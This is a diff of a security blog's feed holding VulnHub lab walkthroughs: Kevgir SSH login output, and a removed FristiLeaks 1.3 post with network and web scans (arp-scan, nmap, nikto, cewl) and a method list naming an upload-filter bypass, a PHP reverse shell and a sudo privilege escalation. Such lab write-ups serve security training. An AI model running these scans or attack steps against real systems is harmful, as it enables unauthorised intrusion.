+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Kevgir# ssh -p <span class="m">1322</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#x6c;&amp;#x74;&amp;#111;&amp;#58;&amp;#97;&amp;#x64;&amp;#x6d;&amp;#x69;&amp;#110;&amp;#x40;&amp;#49;&amp;#48;&amp;#46;&amp;#49;&amp;#46;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#x32;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x61;&amp;#x64;&amp;#x6d;&amp;#x69;&amp;#110;&amp;#x40;&amp;#x31;&amp;#48;&amp;#46;&amp;#x31;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x32;&amp;#x38;&lt;/a&gt;</span>
 </span><span class='line'>The authenticity of host <span class="p">&amp;</span>lsquo<span class="p">;</span><span class="o">[</span>10.1.1.128<span class="o">]</span>:1322 <span class="o">([</span>10.1.1.128<span class="o">]</span>:1322<span class="o">)</span><span class="p">&amp;</span>rsquo<span class="p">;</span> can<span class="p">&amp;</span>rsquo<span class="p">;</span>t be established.
 </span><span class='line'>ECDSA key fingerprint is 3b:03:cd:29:7b:5e:9f:3b:62:79:ed:dc:82:c7:48:8a.
 </span><span class='line'>Are you sure you want to <span class="k">continue</span> connecting <span class="o">(</span>yes/no<span class="o">)</span>? yes
@@ -1774,7 +2615,7 @@
 </span><span class='line'>&lt;pre&gt;&lt;code&gt;                                               by canyoupwn.me
 </span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
 </span><span class='line'>
-</span><span class='line'>&lt;p&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#58;&amp;#x61;&amp;#x64;&amp;#x6d;&amp;#105;&amp;#110;&amp;#x40;&amp;#49;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#49;&amp;#46;&amp;#49;&amp;#50;&amp;#x38;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x61;&amp;#x64;&amp;#109;&amp;#x69;&amp;#110;&amp;#x40;&amp;#x31;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#49;&amp;#50;&amp;#56;&lt;/a&gt;&amp;rsquo;s password:</span>
+</span><span class='line'>&lt;p&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#97;&amp;#105;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#58;&amp;#97;&amp;#x64;&amp;#109;&amp;#105;&amp;#110;&amp;#64;&amp;#49;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#50;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x61;&amp;#x64;&amp;#109;&amp;#105;&amp;#110;&amp;#x40;&amp;#49;&amp;#x30;&amp;#46;&amp;#49;&amp;#46;&amp;#49;&amp;#46;&amp;#x31;&amp;#50;&amp;#x38;&lt;/a&gt;&amp;rsquo;s password:</span>
 </span><span class='line'>Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>&lt;/p&gt;
 </span><span class='line'>
 </span><span class='line'>&lt;ul&gt;
@@ -2446,7 +3287,7 @@
 <span class='line-number'>44</span>
 <span class='line-number'>45</span>
 <span class='line-number'>46</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh -p <span class="m">1322</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#58;&amp;#97;&amp;#x64;&amp;#109;&amp;#105;&amp;#x6e;&amp;#x40;&amp;#49;&amp;#x30;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x32;&amp;#x38;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#x61;&amp;#100;&amp;#x6d;&amp;#x69;&amp;#x6e;&amp;#x40;&amp;#49;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#46;&amp;#49;&amp;#50;&amp;#56;&lt;/a&gt;&lt;/p&gt;</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ssh -p <span class="m">1322</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#108;&amp;#116;&amp;#x6f;&amp;#58;&amp;#x61;&amp;#x64;&amp;#x6d;&amp;#105;&amp;#110;&amp;#64;&amp;#49;&amp;#48;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#46;&amp;#49;&amp;#50;&amp;#x38;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#97;&amp;#100;&amp;#x6d;&amp;#105;&amp;#x6e;&amp;#64;&amp;#49;&amp;#48;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#50;&amp;#x38;&lt;/a&gt;&lt;/p&gt;</span>
 </span><span class='line'>
 </span><span class='line'>&lt;p&gt;  G:                ,<span class="p">;</span>                                          &lt;br/&gt;
 </span><span class='line'>  E#,    :        f#i                        .Gt  t    j.       &lt;br/&gt;
@@ -2465,9 +3306,9 @@
 </span><span class='line'>&lt;pre&gt;&lt;code&gt;                                               by canyoupwn.me
 </span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
 </span><span class='line'>
-</span><span class='line'>&lt;p&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#97;&amp;#x64;&amp;#x6d;&amp;#x69;&amp;#x6e;&amp;#x40;&amp;#49;&amp;#48;&amp;#46;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#46;&amp;#x31;&amp;#x32;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#97;&amp;#x64;&amp;#x6d;&amp;#105;&amp;#x6e;&amp;#x40;&amp;#x31;&amp;#x30;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#49;&amp;#46;&amp;#x31;&amp;#50;&amp;#56;&lt;/a&gt;&amp;rsquo;s password:</span>
+</span><span class='line'>&lt;p&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#97;&amp;#100;&amp;#109;&amp;#105;&amp;#110;&amp;#64;&amp;#49;&amp;#48;&amp;#46;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x32;&amp;#x38;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#97;&amp;#100;&amp;#x6d;&amp;#x69;&amp;#110;&amp;#64;&amp;#x31;&amp;#x30;&amp;#46;&amp;#x31;&amp;#46;&amp;#49;&amp;#46;&amp;#x31;&amp;#x32;&amp;#56;&lt;/a&gt;&amp;rsquo;s password:</span>
 </span><span class='line'>Permission denied, please try again.
-</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#x61;&amp;#x69;&amp;#x6c;&amp;#116;&amp;#111;&amp;#58;&amp;#97;&amp;#100;&amp;#x6d;&amp;#x69;&amp;#110;&amp;#64;&amp;#x31;&amp;#48;&amp;#46;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#x2e;&amp;#x31;&amp;#50;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#97;&amp;#100;&amp;#x6d;&amp;#105;&amp;#110;&amp;#64;&amp;#49;&amp;#48;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#x2e;&amp;#x31;&amp;#50;&amp;#x38;&lt;/a&gt;&amp;rsquo;s password:</span>
+</span><span class='line'>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#108;&amp;#x74;&amp;#111;&amp;#58;&amp;#97;&amp;#100;&amp;#x6d;&amp;#x69;&amp;#110;&amp;#x40;&amp;#49;&amp;#x30;&amp;#46;&amp;#x31;&amp;#46;&amp;#x31;&amp;#x2e;&amp;#49;&amp;#50;&amp;#56;&quot;</span>&gt;<span class="p">&amp;</span><span class="c">#97;&amp;#100;&amp;#109;&amp;#x69;&amp;#110;&amp;#x40;&amp;#49;&amp;#48;&amp;#46;&amp;#49;&amp;#46;&amp;#49;&amp;#x2e;&amp;#49;&amp;#50;&amp;#x38;&lt;/a&gt;&amp;rsquo;s password:</span>
 </span><span class='line'>Welcome to Ubuntu 14.04.3 LTS <span class="o">(</span>GNU/Linux 3.19.0-25-generic i686<span class="o">)</span>&lt;/p&gt;
 </span><span class='line'>
 </span><span class='line'>&lt;ul&gt;
@@ -3124,1372 +3965,6 @@ I decided to test some basic SQL injection, and it is vulnerable!</p>
 <p><img class="left" src="/downloads/primer101/20.png"></p>
 
 <p>Done :)</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[[VulnHub] FristiLeaks: 1.3]]></title>
-    <link href="http://f4l13n5n0w.github.io/blog/2015/12/29/vulnhub-fristileaks-1-dot-3/"/>
-    <updated>2015-12-29T01:40:24-05:00</updated>
-    <id>http://f4l13n5n0w.github.io/blog/2015/12/29/vulnhub-fristileaks-1-dot-3</id>
-    <content type="html"><![CDATA[<p>&ldquo;A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..&rdquo;  &ndash; <a href="https://www.vulnhub.com/author/ar0xa,203/">Ar0xA</a></p>
-
-<p><font color="red"><strong>[note!!]</strong></font> VMware users will need to manually edit the VM&rsquo;s MAC address to: 08:00:27:A5:A6:76</p>
-
-<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/fristileaks-13,133/">here</a>.</p>
-
-<!-- more -->
-
-
-<h2>Attacker &amp; Target</h2>
-
-<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>
-
-<p>Target: FristiLeaks: 1.3 (<em>10.1.1.150/24</em>)</p>
-
-<h2>Vulnerability &amp; Exploit</h2>
-
-<p>There is no acutal Vulnerabilities, all you need to do to take down this VM is Enumeration and more enumberation.</p>
-
-<ul>
-<li>Create customized dictionary list and brute force to find hidden folders</li>
-<li>Checking source code / comments</li>
-<li>Bypass Apache PHP upload verification / whitelist filter</li>
-<li>Sensitivie information disclosure</li>
-<li>Local priv escape</li>
-</ul>
-
-
-<h2>Method</h2>
-
-<ul>
-<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
-<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
-<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
-<li>Create customized dictionary list based on the web pages [<font color="FF8000">cewl</font>]</li>
-<li>Brute fuzz to find hidden files and paths [<font color="FF8000">wfuzz</font>]</li>
-<li>Bypass whitelist filter to upload reverse PHP shell</li>
-<li>Crack a simple encryption program to decode secret string and local priviledge escalation</li>
-<li>Enumeration and exploit the misconfigured sudo list to get ROOT</li>
-</ul>
-
-
-<h2>Tools</h2>
-
-<p>All the tools used here can be found in Kali Linux</p>
-
-<ul>
-<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
-<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
-<li><a href="https://nmap.org/">nmap</a></li>
-<li><a href="https://cirt.net/Nikto2">nikto</a></li>
-<li><a href="https://digi.ninja/projects/cewl.php">cewl</a></li>
-<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
-<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
-<li><a href="http://www.edge-security.com/wfuzz.php">wfuzz</a></li>
-<li><a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a></li>
-</ul>
-
-
-<h2>Walkthrough</h2>
-
-<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/fristileaks# arp-scan -l
-</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
-</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
-</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
-</span><span class='line'>10.1.1.2    00:50:56:fd:d1:6b   VMware, Inc.
-</span><span class='line'>10.1.1.150  08:00:27:a5:a6:76   CADMUS COMPUTER SYSTEMS
-</span><span class='line'>10.1.1.254  00:50:56:e5:d1:58   VMware, Inc.&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
-</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.661 seconds <span class="o">(</span>96.20 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
-</span><span class='line'>root@kali:~/fristileaks#
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p><code>10.1.1.150</code> is our Target!</p>
-
-<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;h1&gt;Nmap 6.49BETA5 scan initiated Sun Dec <span class="m">27</span> 06:52:12 <span class="m">2015</span> as: nmap -sV -v -A -O -p <span class="m">80</span> -oN 10.1.1.150_nmap.txt 10.1.1.150&lt;/h1&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;Nmap scan report <span class="k">for</span> 10.1.1.150
-</span><span class='line'>Host is up <span class="o">(</span>0.00041s latency<span class="o">)</span>.
-</span><span class='line'>PORT   STATE SERVICE VERSION
-</span><span class='line'>80/tcp open  http    Apache httpd 2.2.15 <span class="o">((</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3<span class="o">)</span>
-</span><span class='line'><span class="p">|</span> http-methods: GET HEAD POST OPTIONS TRACE
-</span><span class='line'><span class="p">|</span> Potentially risky methods: TRACE
-</span><span class='line'><span class="p">|</span>&lt;em&gt;See &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://nmap.org/nsedoc/scripts/http-methods.html&quot;</span>&gt;http://nmap.org/nsedoc/scripts/http-methods.html&lt;/a&gt;
-</span><span class='line'><span class="p">|</span> http-robots.txt: <span class="m">3</span> disallowed entries
-</span><span class='line'><span class="p">|</span>&lt;/em&gt;/cola /sisi /beer
-</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: Apache/2.2.15 <span class="o">(</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3
-</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Site doesn<span class="p">&amp;</span>rsquo<span class="p">;</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8<span class="o">)</span>.
-</span><span class='line'>MAC Address: 08:00:27:A5:A6:76 <span class="o">(</span>Cadmus Computer Systems<span class="o">)</span>
-</span><span class='line'>Warning: OSScan results may be unreliable because we could not find at least <span class="m">1</span> open and <span class="m">1</span> closed port
-</span><span class='line'>Device <span class="nb">type</span>: general purpose
-</span><span class='line'>Running: Linux 2.6.X<span class="p">|</span>3.X
-</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
-</span><span class='line'>OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
-</span><span class='line'>Uptime guess: 49.708 days <span class="o">(</span>since Sat Nov  <span class="m">7</span> 13:52:17 2015<span class="o">)</span>
-</span><span class='line'>Network Distance: <span class="m">1</span> hop
-</span><span class='line'>TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span><span class="m">258</span> <span class="o">(</span>Good luck!<span class="o">)</span>
-</span><span class='line'>IP ID Sequence Generation: All zeros&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;TRACEROUTE
-</span><span class='line'>HOP RTT     ADDRESS
-</span><span class='line'><span class="m">1</span>   0.41 ms 10.1.1.150&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;Read data files from: /usr/bin/../share/nmap
-</span><span class='line'>OS and Service detection performed. Please report any incorrect results at &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org/submit/&quot;</span>&gt;https://nmap.org/submit/&lt;/a&gt; .&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;h1&gt;Nmap <span class="k">done</span> at Sun Dec <span class="m">27</span> 06:52:21 <span class="m">2015</span> <span class="p">&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 10.27 seconds&lt;/h1&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;p&gt;
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>based on the result, I noticed that there are three folders:</p>
-
-<ul>
-<li>/cola</li>
-<li>/sisi</li>
-<li>/beer</li>
-</ul>
-
-
-<p>Also, from the response header: <code>Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3</code>, I know the target is running Apache version 2.2.15 which is outdated, and the keyword <code>DAV/2</code> shows that WebDAV should be enabled.</p>
-
-<p>In the meanwhile, I run <code>nikto</code> to scan web vulnerabilities.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nikto -host &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.150&quot;</span>&gt;http://10.1.1.150&lt;/a&gt;&lt;/p&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;h2&gt;- Nikto v2.1.6&lt;/h2&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;ul&gt;
-</span><span class='line'>&lt;li&gt;Target IP:          10.1.1.150&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;Target Hostname:    10.1.1.150&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;Target Port:        80
-</span><span class='line'>
-</span><span class='line'>&lt;ul&gt;
-</span><span class='line'>&lt;li&gt;Start Time:         2015-12-27 06:53:18 <span class="o">(</span>GMT-5<span class="o">)</span>&lt;/li&gt;
-</span><span class='line'>&lt;/ul&gt;
-</span><span class='line'>&lt;/li&gt;
-</span><span class='line'>&lt;/ul&gt;
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>&lt;hr /&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;ul&gt;
-</span><span class='line'>&lt;li&gt;Server: Apache/2.2.15 <span class="o">(</span>CentOS<span class="o">)</span> DAV/2 PHP/5.3.3&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;Server leaks inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov <span class="m">17</span> 13:45:47 2015&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;The anti-clickjacking X-Frame-Options header is not present.&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME <span class="nb">type</span>&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/cola/<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/sisi/<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;Entry <span class="p">&amp;</span>lsquo<span class="p">;</span>/beer/<span class="p">&amp;</span>rsquo<span class="p">;</span> in robots.txt returned a non-forbidden or redirect HTTP code <span class="o">(</span>200<span class="o">)</span>&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;<span class="p">&amp;</span>ldquo<span class="p">;</span>robots.txt<span class="p">&amp;</span>rdquo<span class="p">;</span> contains <span class="m">3</span> entries which should be manually viewed.&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;Apache/2.2.15 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.12<span class="o">)</span>. Apache 2.0.65 <span class="o">(</span>final release<span class="o">)</span> and 2.2.29 are also current.&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;PHP/5.3.3 appears to be outdated <span class="o">(</span>current is at least 5.6.9<span class="o">)</span>. PHP 5.5.25 and 5.4.41 are also current.&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;OSVDB-3268: /icons/: Directory indexing found.&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;OSVDB-3268: /images/: Directory indexing found.&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;OSVDB-3268: /images/?pattern<span class="o">=</span>/etc/*<span class="p">&amp;</span>amp<span class="p">;</span><span class="nv">sort</span><span class="o">=</span>name: Directory indexing found.&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;OSVDB-3233: /icons/README: Apache default file found.&lt;/li&gt;
-</span><span class='line'>&lt;li&gt;8330 requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">16</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
-</span><span class='line'>
-</span><span class='line'>&lt;ul&gt;
-</span><span class='line'>&lt;li&gt;End Time:           2015-12-27 06:53:38 <span class="o">(</span>GMT-5<span class="o">)</span> <span class="o">(</span><span class="m">20</span> seconds<span class="o">)</span>&lt;/li&gt;
-</span><span class='line'>&lt;/ul&gt;
-</span><span class='line'>&lt;/li&gt;
-</span><span class='line'>&lt;/ul&gt;
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>&lt;hr /&gt;
-</span><span class='line'>
-</span><span class='line'>&lt;ul&gt;
-</span><span class='line'>&lt;li&gt;1 host<span class="o">(</span>s<span class="o">)</span> tested
-</span></code></pre></td></tr></table></div></figure></li>
-</ul>
-
-
-<p>The result just proved what we have found previously but nothing new.</p>
-
-<p>Then I visit the three folders one by one, but keep getting the same responded picture:</p>
-
-<p><img class="left" src="/downloads/fristileaks/1.jpg"></p>
-
-<p>After tried <code>dirbuster</code> with several default dictionary files but nothing found, I decided to make a customized dict list which including all the words displayed in the web pages and images with tool <code>cewl</code>.</p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-<span class='line-number'>41</span>
-<span class='line-number'>42</span>
-<span class='line-number'>43</span>
-<span class='line-number'>44</span>
-<span class='line-number'>45</span>
-<span class='line-number'>46</span>
-<span class='line-number'>47</span>
-<span class='line-number'>48</span>
-<span class='line-number'>49</span>
-<span class='line-number'>50</span>
-<span class='line-number'>51</span>
-<span class='line-number'>52</span>
-<span class='line-number'>53</span>
-<span class='line-number'>54</span>
-<span class='line-number'>55</span>
-<span class='line-number'>56</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/fristileaks# cewl -v -d <span class="m">2</span> -w cewl_dict_list.txt  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://10.1.1.150/&quot;</span>&gt;http://10.1.1.150/&lt;/a&gt;
-</span><span class='line'>root@kali:~/fristileaks# cat cewl_dict_list.txt
-</span><span class='line'>Ar0xA
-</span><span class='line'>meneer
-</span><span class='line'>quick
-</span><span class='line'>hackme
-</span><span class='line'>Welcome
-</span><span class='line'>Goal
-</span><span class='line'>get
-</span><span class='line'>UID
-</span><span class='line'>root
-</span><span class='line'>and
-</span><span class='line'><span class="nb">read</span>
-</span><span class='line'>the
-</span><span class='line'>special
-</span><span class='line'>flag
-</span><span class='line'>file
-</span><span class='line'>Timeframe
-</span><span class='line'>should
-</span><span class='line'>doable
-</span><span class='line'>hours
-</span><span class='line'>The
-</span><span class='line'>fristileaks
-</span><span class='line'>motto
-</span><span class='line'>Fristileaks
-</span><span class='line'>2015
-</span><span class='line'>are
-</span><span class='line'>Fristleaks
-</span><span class='line'>barrebas
-</span><span class='line'>rikvduijn
-</span><span class='line'>wez3forsec
-</span><span class='line'>PyroBatNL
-</span><span class='line'>0xDUDE
-</span><span class='line'>annejanbrouwer
